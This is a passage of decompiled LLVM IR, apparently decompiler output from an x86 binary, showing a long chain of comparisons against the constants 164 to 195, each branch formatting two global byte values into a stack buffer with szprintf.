  %v1_804bfe4 = zext i8 %v0_804bfe4 to i32
  %v2_804bff3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bff3, i32* @ebx, align 4
  %v4_804c005 = call i32 @szprintf(i32 %v2_804bff3, i32 ptrtoint ([14 x i8]* @global_var_80598d5.186 to i32), i32 %v1_804bfe4)
  br label %dec_label_pc_804c00a

dec_label_pc_804c00a:                             ; preds = %dec_label_pc_804bfd1, %dec_label_pc_804bfda
  %v13_804c00a = icmp eq i32 %v2_8049ce5, 164
  %v1_804c011 = icmp eq i1 %v13_804c00a, false
  br i1 %v1_804c011, label %dec_label_pc_804c043, label %dec_label_pc_804c013

dec_label_pc_804c013:                             ; preds = %dec_label_pc_804c00a
  %v0_804c013 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c013 = zext i8 %v0_804c013 to i32
  store i32 %v1_804c013, i32* @edx, align 4
  %v0_804c01d = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c01d = zext i8 %v0_804c01d to i32
  %v2_804c02c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c02c, i32* @ebx, align 4
  %v4_804c03e = call i32 @szprintf(i32 %v2_804c02c, i32 ptrtoint ([14 x i8]* @global_var_8059843.175 to i32), i32 %v1_804c01d)
  br label %dec_label_pc_804c043

dec_label_pc_804c043:                             ; preds = %dec_label_pc_804c00a, %dec_label_pc_804c013
  %v13_804c043 = icmp eq i32 %v2_8049ce5, 165
  %v1_804c04a = icmp eq i1 %v13_804c043, false
  br i1 %v1_804c04a, label %dec_label_pc_804c07c, label %dec_label_pc_804c04c

dec_label_pc_804c04c:                             ; preds = %dec_label_pc_804c043
  %v0_804c04c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c04c = zext i8 %v0_804c04c to i32
  store i32 %v1_804c04c, i32* @edx, align 4
  %v0_804c056 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c056 = zext i8 %v0_804c056 to i32
  %v2_804c065 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c065, i32* @ebx, align 4
  %v4_804c077 = call i32 @szprintf(i32 %v2_804c065, i32 ptrtoint ([13 x i8]* @global_var_80598e3.187 to i32), i32 %v1_804c056)
  br label %dec_label_pc_804c07c

dec_label_pc_804c07c:                             ; preds = %dec_label_pc_804c043, %dec_label_pc_804c04c
  %v13_804c07c = icmp eq i32 %v2_8049ce5, 166
  %v1_804c083 = icmp eq i1 %v13_804c07c, false
  br i1 %v1_804c083, label %dec_label_pc_804c0b5, label %dec_label_pc_804c085

dec_label_pc_804c085:                             ; preds = %dec_label_pc_804c07c
  %v0_804c085 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c085 = zext i8 %v0_804c085 to i32
  store i32 %v1_804c085, i32* @edx, align 4
  %v0_804c08f = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c08f = zext i8 %v0_804c08f to i32
  %v2_804c09e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c09e, i32* @ebx, align 4
  %v4_804c0b0 = call i32 @szprintf(i32 %v2_804c09e, i32 ptrtoint ([14 x i8]* @global_var_80598f0.188 to i32), i32 %v1_804c08f)
  br label %dec_label_pc_804c0b5

dec_label_pc_804c0b5:                             ; preds = %dec_label_pc_804c07c, %dec_label_pc_804c085
  %v13_804c0b5 = icmp eq i32 %v2_8049ce5, 167
  %v1_804c0bc = icmp eq i1 %v13_804c0b5, false
  br i1 %v1_804c0bc, label %dec_label_pc_804c0ee, label %dec_label_pc_804c0be

dec_label_pc_804c0be:                             ; preds = %dec_label_pc_804c0b5
  %v0_804c0be = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c0be = zext i8 %v0_804c0be to i32
  store i32 %v1_804c0be, i32* @edx, align 4
  %v0_804c0c8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c0c8 = zext i8 %v0_804c0c8 to i32
  %v2_804c0d7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0d7, i32* @ebx, align 4
  %v4_804c0e9 = call i32 @szprintf(i32 %v2_804c0d7, i32 ptrtoint ([14 x i8]* @global_var_805989e.182 to i32), i32 %v1_804c0c8)
  br label %dec_label_pc_804c0ee

dec_label_pc_804c0ee:                             ; preds = %dec_label_pc_804c0b5, %dec_label_pc_804c0be
  %v13_804c0ee = icmp eq i32 %v2_8049ce5, 168
  %v1_804c0f5 = icmp eq i1 %v13_804c0ee, false
  br i1 %v1_804c0f5, label %dec_label_pc_804c127, label %dec_label_pc_804c0f7

dec_label_pc_804c0f7:                             ; preds = %dec_label_pc_804c0ee
  %v0_804c0f7 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c0f7 = zext i8 %v0_804c0f7 to i32
  store i32 %v1_804c0f7, i32* @edx, align 4
  %v0_804c101 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c101 = zext i8 %v0_804c101 to i32
  %v2_804c110 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c110, i32* @ebx, align 4
  %v4_804c122 = call i32 @szprintf(i32 %v2_804c110, i32 ptrtoint ([14 x i8]* @global_var_80598fe.189 to i32), i32 %v1_804c101)
  br label %dec_label_pc_804c127

dec_label_pc_804c127:                             ; preds = %dec_label_pc_804c0ee, %dec_label_pc_804c0f7
  %v13_804c127 = icmp eq i32 %v2_8049ce5, 169
  %v1_804c12e = icmp eq i1 %v13_804c127, false
  br i1 %v1_804c12e, label %dec_label_pc_804c160, label %dec_label_pc_804c130

dec_label_pc_804c130:                             ; preds = %dec_label_pc_804c127
  %v0_804c130 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c130 = zext i8 %v0_804c130 to i32
  store i32 %v1_804c130, i32* @edx, align 4
  %v0_804c13a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c13a = zext i8 %v0_804c13a to i32
  %v2_804c149 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c149, i32* @ebx, align 4
  %v4_804c15b = call i32 @szprintf(i32 %v2_804c149, i32 ptrtoint ([14 x i8]* @global_var_805990c.190 to i32), i32 %v1_804c13a)
  br label %dec_label_pc_804c160

dec_label_pc_804c160:                             ; preds = %dec_label_pc_804c127, %dec_label_pc_804c130
  %v13_804c160 = icmp eq i32 %v2_8049ce5, 171
  %v1_804c167 = icmp eq i1 %v13_804c160, false
  br i1 %v1_804c167, label %dec_label_pc_804c199, label %dec_label_pc_804c169

dec_label_pc_804c169:                             ; preds = %dec_label_pc_804c160
  %v0_804c169 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c169 = zext i8 %v0_804c169 to i32
  store i32 %v1_804c169, i32* @edx, align 4
  %v0_804c173 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c173 = zext i8 %v0_804c173 to i32
  %v2_804c182 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c182, i32* @ebx, align 4
  %v4_804c194 = call i32 @szprintf(i32 %v2_804c182, i32 ptrtoint ([14 x i8]* @global_var_805991a.191 to i32), i32 %v1_804c173)
  br label %dec_label_pc_804c199

dec_label_pc_804c199:                             ; preds = %dec_label_pc_804c160, %dec_label_pc_804c169
  %v13_804c199 = icmp eq i32 %v2_8049ce5, 172
  %v1_804c1a0 = icmp eq i1 %v13_804c199, false
  br i1 %v1_804c1a0, label %dec_label_pc_804c1d2, label %dec_label_pc_804c1a2

dec_label_pc_804c1a2:                             ; preds = %dec_label_pc_804c199
  %v0_804c1a2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c1a2 = zext i8 %v0_804c1a2 to i32
  store i32 %v1_804c1a2, i32* @edx, align 4
  %v0_804c1ac = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c1ac = zext i8 %v0_804c1ac to i32
  %v2_804c1bb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1bb, i32* @ebx, align 4
  %v4_804c1cd = call i32 @szprintf(i32 %v2_804c1bb, i32 ptrtoint ([14 x i8]* @global_var_8059928.192 to i32), i32 %v1_804c1ac)
  br label %dec_label_pc_804c1d2

dec_label_pc_804c1d2:                             ; preds = %dec_label_pc_804c199, %dec_label_pc_804c1a2
  %v13_804c1d2 = icmp eq i32 %v2_8049ce5, 173
  %v1_804c1d9 = icmp eq i1 %v13_804c1d2, false
  br i1 %v1_804c1d9, label %dec_label_pc_804c20b, label %dec_label_pc_804c1db

dec_label_pc_804c1db:                             ; preds = %dec_label_pc_804c1d2
  %v0_804c1db = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c1db = zext i8 %v0_804c1db to i32
  store i32 %v1_804c1db, i32* @edx, align 4
  %v0_804c1e5 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c1e5 = zext i8 %v0_804c1e5 to i32
  %v2_804c1f4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1f4, i32* @ebx, align 4
  %v4_804c206 = call i32 @szprintf(i32 %v2_804c1f4, i32 ptrtoint ([14 x i8]* @global_var_8059936.193 to i32), i32 %v1_804c1e5)
  br label %dec_label_pc_804c20b

dec_label_pc_804c20b:                             ; preds = %dec_label_pc_804c1d2, %dec_label_pc_804c1db
  %v13_804c20b = icmp eq i32 %v2_8049ce5, 174
  %v1_804c212 = icmp eq i1 %v13_804c20b, false
  br i1 %v1_804c212, label %dec_label_pc_804c244, label %dec_label_pc_804c214

dec_label_pc_804c214:                             ; preds = %dec_label_pc_804c20b
  %v0_804c214 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c214 = zext i8 %v0_804c214 to i32
  store i32 %v1_804c214, i32* @edx, align 4
  %v0_804c21e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c21e = zext i8 %v0_804c21e to i32
  %v2_804c22d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c22d, i32* @ebx, align 4
  %v4_804c23f = call i32 @szprintf(i32 %v2_804c22d, i32 ptrtoint ([13 x i8]* @global_var_8059944.194 to i32), i32 %v1_804c21e)
  br label %dec_label_pc_804c244

dec_label_pc_804c244:                             ; preds = %dec_label_pc_804c20b, %dec_label_pc_804c214
  %v13_804c244 = icmp eq i32 %v2_8049ce5, 175
  %v1_804c24b = icmp eq i1 %v13_804c244, false
  br i1 %v1_804c24b, label %dec_label_pc_804c27d, label %dec_label_pc_804c24d

dec_label_pc_804c24d:                             ; preds = %dec_label_pc_804c244
  %v0_804c24d = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c24d = zext i8 %v0_804c24d to i32
  store i32 %v1_804c24d, i32* @edx, align 4
  %v0_804c257 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c257 = zext i8 %v0_804c257 to i32
  %v2_804c266 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c266, i32* @ebx, align 4
  %v4_804c278 = call i32 @szprintf(i32 %v2_804c266, i32 ptrtoint ([14 x i8]* @global_var_8059951.195 to i32), i32 %v1_804c257)
  br label %dec_label_pc_804c27d

dec_label_pc_804c27d:                             ; preds = %dec_label_pc_804c244, %dec_label_pc_804c24d
  %v10_804c27d = icmp eq i32 %v2_8049ce5, 176
  %v1_804c284 = icmp eq i1 %v10_804c27d, false
  br i1 %v1_804c284, label %dec_label_pc_804c2b6, label %dec_label_pc_804c286

dec_label_pc_804c286:                             ; preds = %dec_label_pc_804c27d
  %v0_804c286 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c286 = zext i8 %v0_804c286 to i32
  store i32 %v1_804c286, i32* @edx, align 4
  %v0_804c290 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c290 = zext i8 %v0_804c290 to i32
  %v2_804c29f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c29f, i32* @ebx, align 4
  %v4_804c2b1 = call i32 @szprintf(i32 %v2_804c29f, i32 ptrtoint ([14 x i8]* @global_var_805995f.196 to i32), i32 %v1_804c290)
  br label %dec_label_pc_804c2b6

dec_label_pc_804c2b6:                             ; preds = %dec_label_pc_804c27d, %dec_label_pc_804c286
  %v13_804c2b6 = icmp eq i32 %v2_8049ce5, 177
  %v1_804c2bd = icmp eq i1 %v13_804c2b6, false
  br i1 %v1_804c2bd, label %dec_label_pc_804c2ef, label %dec_label_pc_804c2bf

dec_label_pc_804c2bf:                             ; preds = %dec_label_pc_804c2b6
  %v0_804c2bf = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c2bf = zext i8 %v0_804c2bf to i32
  store i32 %v1_804c2bf, i32* @edx, align 4
  %v0_804c2c9 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c2c9 = zext i8 %v0_804c2c9 to i32
  %v2_804c2d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2d8, i32* @ebx, align 4
  %v4_804c2ea = call i32 @szprintf(i32 %v2_804c2d8, i32 ptrtoint ([14 x i8]* @global_var_805996d.197 to i32), i32 %v1_804c2c9)
  br label %dec_label_pc_804c2ef

dec_label_pc_804c2ef:                             ; preds = %dec_label_pc_804c2b6, %dec_label_pc_804c2bf
  %v13_804c2ef = icmp eq i32 %v2_8049ce5, 178
  %v1_804c2f6 = icmp eq i1 %v13_804c2ef, false
  br i1 %v1_804c2f6, label %dec_label_pc_804c328, label %dec_label_pc_804c2f8

dec_label_pc_804c2f8:                             ; preds = %dec_label_pc_804c2ef
  %v0_804c2f8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c2f8 = zext i8 %v0_804c2f8 to i32
  store i32 %v1_804c2f8, i32* @edx, align 4
  %v0_804c302 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c302 = zext i8 %v0_804c302 to i32
  %v2_804c311 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c311, i32* @ebx, align 4
  %v4_804c323 = call i32 @szprintf(i32 %v2_804c311, i32 ptrtoint ([13 x i8]* @global_var_805997b.198 to i32), i32 %v1_804c302)
  br label %dec_label_pc_804c328

dec_label_pc_804c328:                             ; preds = %dec_label_pc_804c2ef, %dec_label_pc_804c2f8
  %v13_804c328 = icmp eq i32 %v2_8049ce5, 179
  %v1_804c32f = icmp eq i1 %v13_804c328, false
  br i1 %v1_804c32f, label %dec_label_pc_804c361, label %dec_label_pc_804c331

dec_label_pc_804c331:                             ; preds = %dec_label_pc_804c328
  %v0_804c331 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c331 = zext i8 %v0_804c331 to i32
  store i32 %v1_804c331, i32* @edx, align 4
  %v0_804c33b = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c33b = zext i8 %v0_804c33b to i32
  %v2_804c34a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c34a, i32* @ebx, align 4
  %v4_804c35c = call i32 @szprintf(i32 %v2_804c34a, i32 ptrtoint ([13 x i8]* @global_var_8059988.199 to i32), i32 %v1_804c33b)
  br label %dec_label_pc_804c361

dec_label_pc_804c361:                             ; preds = %dec_label_pc_804c328, %dec_label_pc_804c331
  %v13_804c361 = icmp eq i32 %v2_8049ce5, 180
  %v1_804c368 = icmp eq i1 %v13_804c361, false
  br i1 %v1_804c368, label %dec_label_pc_804c39a, label %dec_label_pc_804c36a

dec_label_pc_804c36a:                             ; preds = %dec_label_pc_804c361
  %v0_804c36a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c36a = zext i8 %v0_804c36a to i32
  store i32 %v1_804c36a, i32* @edx, align 4
  %v0_804c374 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c374 = zext i8 %v0_804c374 to i32
  %v2_804c383 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c383, i32* @ebx, align 4
  %v4_804c395 = call i32 @szprintf(i32 %v2_804c383, i32 ptrtoint ([13 x i8]* @global_var_8059995.200 to i32), i32 %v1_804c374)
  br label %dec_label_pc_804c39a

dec_label_pc_804c39a:                             ; preds = %dec_label_pc_804c361, %dec_label_pc_804c36a
  %v13_804c39a = icmp eq i32 %v2_8049ce5, 181
  %v1_804c3a1 = icmp eq i1 %v13_804c39a, false
  br i1 %v1_804c3a1, label %dec_label_pc_804c3d3, label %dec_label_pc_804c3a3

dec_label_pc_804c3a3:                             ; preds = %dec_label_pc_804c39a
  %v0_804c3a3 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c3a3 = zext i8 %v0_804c3a3 to i32
  store i32 %v1_804c3a3, i32* @edx, align 4
  %v0_804c3ad = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c3ad = zext i8 %v0_804c3ad to i32
  %v2_804c3bc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3bc, i32* @ebx, align 4
  %v4_804c3ce = call i32 @szprintf(i32 %v2_804c3bc, i32 ptrtoint ([13 x i8]* @global_var_80599a2.201 to i32), i32 %v1_804c3ad)
  br label %dec_label_pc_804c3d3

dec_label_pc_804c3d3:                             ; preds = %dec_label_pc_804c39a, %dec_label_pc_804c3a3
  %v13_804c3d3 = icmp eq i32 %v2_8049ce5, 182
  %v1_804c3da = icmp eq i1 %v13_804c3d3, false
  br i1 %v1_804c3da, label %dec_label_pc_804c40c, label %dec_label_pc_804c3dc

dec_label_pc_804c3dc:                             ; preds = %dec_label_pc_804c3d3
  %v0_804c3dc = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c3dc = zext i8 %v0_804c3dc to i32
  store i32 %v1_804c3dc, i32* @edx, align 4
  %v0_804c3e6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c3e6 = zext i8 %v0_804c3e6 to i32
  %v2_804c3f5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3f5, i32* @ebx, align 4
  %v4_804c407 = call i32 @szprintf(i32 %v2_804c3f5, i32 ptrtoint ([13 x i8]* @global_var_80599af.202 to i32), i32 %v1_804c3e6)
  br label %dec_label_pc_804c40c

dec_label_pc_804c40c:                             ; preds = %dec_label_pc_804c3d3, %dec_label_pc_804c3dc
  %v13_804c40c = icmp eq i32 %v2_8049ce5, 183
  %v1_804c413 = icmp eq i1 %v13_804c40c, false
  br i1 %v1_804c413, label %dec_label_pc_804c445, label %dec_label_pc_804c415

dec_label_pc_804c415:                             ; preds = %dec_label_pc_804c40c
  %v0_804c415 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c415 = zext i8 %v0_804c415 to i32
  store i32 %v1_804c415, i32* @edx, align 4
  %v0_804c41f = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c41f = zext i8 %v0_804c41f to i32
  %v2_804c42e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c42e, i32* @ebx, align 4
  %v4_804c440 = call i32 @szprintf(i32 %v2_804c42e, i32 ptrtoint ([13 x i8]* @global_var_80592fa.73 to i32), i32 %v1_804c41f)
  br label %dec_label_pc_804c445

dec_label_pc_804c445:                             ; preds = %dec_label_pc_804c40c, %dec_label_pc_804c415
  %v13_804c445 = icmp eq i32 %v2_8049ce5, 184
  %v1_804c44c = icmp eq i1 %v13_804c445, false
  br i1 %v1_804c44c, label %dec_label_pc_804c47e, label %dec_label_pc_804c44e

dec_label_pc_804c44e:                             ; preds = %dec_label_pc_804c445
  %v0_804c44e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c44e = zext i8 %v0_804c44e to i32
  store i32 %v1_804c44e, i32* @edx, align 4
  %v0_804c458 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c458 = zext i8 %v0_804c458 to i32
  %v2_804c467 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c467, i32* @ebx, align 4
  %v4_804c479 = call i32 @szprintf(i32 %v2_804c467, i32 ptrtoint ([13 x i8]* @global_var_80599bc.203 to i32), i32 %v1_804c458)
  br label %dec_label_pc_804c47e

dec_label_pc_804c47e:                             ; preds = %dec_label_pc_804c445, %dec_label_pc_804c44e
  %v13_804c47e = icmp eq i32 %v2_8049ce5, 185
  %v1_804c485 = icmp eq i1 %v13_804c47e, false
  br i1 %v1_804c485, label %dec_label_pc_804c4b7, label %dec_label_pc_804c487

dec_label_pc_804c487:                             ; preds = %dec_label_pc_804c47e
  %v0_804c487 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c487 = zext i8 %v0_804c487 to i32
  store i32 %v1_804c487, i32* @edx, align 4
  %v0_804c491 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c491 = zext i8 %v0_804c491 to i32
  %v2_804c4a0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4a0, i32* @ebx, align 4
  %v4_804c4b2 = call i32 @szprintf(i32 %v2_804c4a0, i32 ptrtoint ([13 x i8]* @global_var_80599c9.204 to i32), i32 %v1_804c491)
  br label %dec_label_pc_804c4b7

dec_label_pc_804c4b7:                             ; preds = %dec_label_pc_804c47e, %dec_label_pc_804c487
  %v13_804c4b7 = icmp eq i32 %v2_8049ce5, 186
  %v1_804c4be = icmp eq i1 %v13_804c4b7, false
  br i1 %v1_804c4be, label %dec_label_pc_804c4f0, label %dec_label_pc_804c4c0

dec_label_pc_804c4c0:                             ; preds = %dec_label_pc_804c4b7
  %v0_804c4c0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c4c0 = zext i8 %v0_804c4c0 to i32
  store i32 %v1_804c4c0, i32* @edx, align 4
  %v0_804c4ca = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c4ca = zext i8 %v0_804c4ca to i32
  %v2_804c4d9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4d9, i32* @ebx, align 4
  %v4_804c4eb = call i32 @szprintf(i32 %v2_804c4d9, i32 ptrtoint ([14 x i8]* @global_var_80599d6.205 to i32), i32 %v1_804c4ca)
  br label %dec_label_pc_804c4f0

dec_label_pc_804c4f0:                             ; preds = %dec_label_pc_804c4b7, %dec_label_pc_804c4c0
  %v13_804c4f0 = icmp eq i32 %v2_8049ce5, 187
  %v1_804c4f7 = icmp eq i1 %v13_804c4f0, false
  br i1 %v1_804c4f7, label %dec_label_pc_804c529, label %dec_label_pc_804c4f9

dec_label_pc_804c4f9:                             ; preds = %dec_label_pc_804c4f0
  %v0_804c4f9 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c4f9 = zext i8 %v0_804c4f9 to i32
  store i32 %v1_804c4f9, i32* @edx, align 4
  %v0_804c503 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c503 = zext i8 %v0_804c503 to i32
  %v2_804c512 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c512, i32* @ebx, align 4
  %v4_804c524 = call i32 @szprintf(i32 %v2_804c512, i32 ptrtoint ([14 x i8]* @global_var_80599e4.206 to i32), i32 %v1_804c503)
  br label %dec_label_pc_804c529

dec_label_pc_804c529:                             ; preds = %dec_label_pc_804c4f0, %dec_label_pc_804c4f9
  %v13_804c529 = icmp eq i32 %v2_8049ce5, 188
  %v1_804c530 = icmp eq i1 %v13_804c529, false
  br i1 %v1_804c530, label %dec_label_pc_804c562, label %dec_label_pc_804c532

dec_label_pc_804c532:                             ; preds = %dec_label_pc_804c529
  %v0_804c532 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c532 = zext i8 %v0_804c532 to i32
  store i32 %v1_804c532, i32* @edx, align 4
  %v0_804c53c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c53c = zext i8 %v0_804c53c to i32
  %v2_804c54b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c54b, i32* @ebx, align 4
  %v4_804c55d = call i32 @szprintf(i32 %v2_804c54b, i32 ptrtoint ([14 x i8]* @global_var_80599f2.207 to i32), i32 %v1_804c53c)
  br label %dec_label_pc_804c562

dec_label_pc_804c562:                             ; preds = %dec_label_pc_804c529, %dec_label_pc_804c532
  %v13_804c562 = icmp eq i32 %v2_8049ce5, 189
  %v1_804c569 = icmp eq i1 %v13_804c562, false
  br i1 %v1_804c569, label %dec_label_pc_804c59b, label %dec_label_pc_804c56b

dec_label_pc_804c56b:                             ; preds = %dec_label_pc_804c562
  %v0_804c56b = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c56b = zext i8 %v0_804c56b to i32
  store i32 %v1_804c56b, i32* @edx, align 4
  %v0_804c575 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c575 = zext i8 %v0_804c575 to i32
  %v2_804c584 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c584, i32* @ebx, align 4
  %v4_804c596 = call i32 @szprintf(i32 %v2_804c584, i32 ptrtoint ([14 x i8]* @global_var_8059a00.208 to i32), i32 %v1_804c575)
  br label %dec_label_pc_804c59b

dec_label_pc_804c59b:                             ; preds = %dec_label_pc_804c562, %dec_label_pc_804c56b
  %v13_804c59b = icmp eq i32 %v2_8049ce5, 190
  %v1_804c5a2 = icmp eq i1 %v13_804c59b, false
  br i1 %v1_804c5a2, label %dec_label_pc_804c5d4, label %dec_label_pc_804c5a4

dec_label_pc_804c5a4:                             ; preds = %dec_label_pc_804c59b
  %v0_804c5a4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c5a4 = zext i8 %v0_804c5a4 to i32
  store i32 %v1_804c5a4, i32* @edx, align 4
  %v0_804c5ae = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c5ae = zext i8 %v0_804c5ae to i32
  %v2_804c5bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5bd, i32* @ebx, align 4
  %v4_804c5cf = call i32 @szprintf(i32 %v2_804c5bd, i32 ptrtoint ([14 x i8]* @global_var_8059a0e.209 to i32), i32 %v1_804c5ae)
  br label %dec_label_pc_804c5d4

dec_label_pc_804c5d4:                             ; preds = %dec_label_pc_804c59b, %dec_label_pc_804c5a4
  %v13_804c5d4 = icmp eq i32 %v2_8049ce5, 191
  %v1_804c5db = icmp eq i1 %v13_804c5d4, false
  br i1 %v1_804c5db, label %dec_label_pc_804c60d, label %dec_label_pc_804c5dd

dec_label_pc_804c5dd:                             ; preds = %dec_label_pc_804c5d4
  %v0_804c5dd = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c5dd = zext i8 %v0_804c5dd to i32
  store i32 %v1_804c5dd, i32* @edx, align 4
  %v0_804c5e7 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c5e7 = zext i8 %v0_804c5e7 to i32
  %v2_804c5f6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5f6, i32* @ebx, align 4
  %v4_804c608 = call i32 @szprintf(i32 %v2_804c5f6, i32 ptrtoint ([14 x i8]* @global_var_8059a1c.210 to i32), i32 %v1_804c5e7)
  br label %dec_label_pc_804c60d

dec_label_pc_804c60d:                             ; preds = %dec_label_pc_804c5d4, %dec_label_pc_804c5dd
  %v10_804c60d = icmp eq i32 %v2_8049ce5, 192
  %v1_804c614 = icmp eq i1 %v10_804c60d, false
  br i1 %v1_804c614, label %dec_label_pc_804c646, label %dec_label_pc_804c616

dec_label_pc_804c616:                             ; preds = %dec_label_pc_804c60d
  %v0_804c616 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c616 = zext i8 %v0_804c616 to i32
  store i32 %v1_804c616, i32* @edx, align 4
  %v0_804c620 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c620 = zext i8 %v0_804c620 to i32
  %v2_804c62f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c62f, i32* @ebx, align 4
  %v4_804c641 = call i32 @szprintf(i32 %v2_804c62f, i32 ptrtoint ([13 x i8]* @global_var_8059a2a.211 to i32), i32 %v1_804c620)
  br label %dec_label_pc_804c646

dec_label_pc_804c646:                             ; preds = %dec_label_pc_804c60d, %dec_label_pc_804c616
  %v13_804c646 = icmp eq i32 %v2_8049ce5, 193
  %v1_804c64d = icmp eq i1 %v13_804c646, false
  br i1 %v1_804c64d, label %dec_label_pc_804c67f, label %dec_label_pc_804c64f

dec_label_pc_804c64f:                             ; preds = %dec_label_pc_804c646
  %v0_804c64f = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c64f = zext i8 %v0_804c64f to i32
  store i32 %v1_804c64f, i32* @edx, align 4
  %v0_804c659 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c659 = zext i8 %v0_804c659 to i32
  %v2_804c668 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c668, i32* @ebx, align 4
  %v4_804c67a = call i32 @szprintf(i32 %v2_804c668, i32 ptrtoint ([13 x i8]* @global_var_8059a37.212 to i32), i32 %v1_804c659)
  br label %dec_label_pc_804c67f

dec_label_pc_804c67f:                             ; preds = %dec_label_pc_804c646, %dec_label_pc_804c64f
  %v13_804c67f = icmp eq i32 %v2_8049ce5, 194
  %v1_804c686 = icmp eq i1 %v13_804c67f, false
  br i1 %v1_804c686, label %dec_label_pc_804c6b8, label %dec_label_pc_804c688

dec_label_pc_804c688:                             ; preds = %dec_label_pc_804c67f
  %v0_804c688 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c688 = zext i8 %v0_804c688 to i32
  store i32 %v1_804c688, i32* @edx, align 4
  %v0_804c692 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c692 = zext i8 %v0_804c692 to i32
  %v2_804c6a1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6a1, i32* @ebx, align 4
  %v4_804c6b3 = call i32 @szprintf(i32 %v2_804c6a1, i32 ptrtoint ([14 x i8]* @global_var_8059a44.213 to i32), i32 %v1_804c692)
  br label %dec_label_pc_804c6b8

dec_label_pc_804c6b8:                             ; preds = %dec_label_pc_804c67f, %dec_label_pc_804c688
  %v13_804c6b8 = icmp eq i32 %v2_8049ce5, 195
  %v1_804c6bf = icmp eq i1 %v13_804c6b8, false
  br i1 %v1_804c6bf, label %dec_label_pc_804c6f1, label %dec_label_pc_804c6c1

